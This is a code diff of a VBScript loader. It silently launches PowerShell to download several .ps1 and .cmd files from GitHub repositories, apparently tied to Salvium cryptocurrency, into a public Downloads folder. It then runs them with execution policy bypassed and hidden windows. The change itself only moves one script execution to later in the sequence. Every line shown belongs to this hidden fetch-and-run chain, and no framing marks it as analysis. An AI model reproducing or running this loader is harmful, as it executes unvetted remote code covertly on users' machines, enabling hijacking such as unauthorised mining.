@@ -19,7 +19,6 @@ objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubu
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/Salvium-SAL-/refs/heads/main/LFO.ps1 -OutFile C:\Users\Public\Downloads\LFO.ps1", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/Salvium-SAL-/refs/heads/main/restartvps.ps1 -OutFile C:\Users\Public\Downloads\restartvps.ps1", 0, True
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
-objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\restartvps.ps1", 0, True
 WScript.Sleep 10000
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/ring.ps1 -OutFile C:\Users\Public\Downloads\ring.ps1", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/rings.cmd -OutFile C:\Users\Public\Downloads\rings.cmd", 0, True
@@ -33,4 +32,5 @@ objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\ring.ps1", 0, True
 WScript.Sleep 20000
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
+objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\restartvps.ps1", 0, True
 objShell.Run "powershell.exe exit", 0, False
